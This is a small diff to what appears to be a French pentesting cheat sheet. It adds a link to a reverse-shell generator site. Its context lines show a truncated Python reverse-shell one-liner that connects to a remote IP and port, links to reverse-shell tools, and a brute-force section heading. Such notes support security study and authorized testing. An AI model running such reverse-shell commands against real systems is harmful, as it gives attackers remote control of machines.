@@ -93,6 +93,8 @@ export RHOST="10.10.14.5";export RPORT=4242;python3 -c 'import socket,os,pty;s=s
 Autre NetCat : https://github.com/xct/xc
 ............ : https://github.com/calebstewart/pwncat
 
+https://www.revshells.com/ : Générateur de shell
+
 
 # BRUTE FORCE
 Avec Hydra :
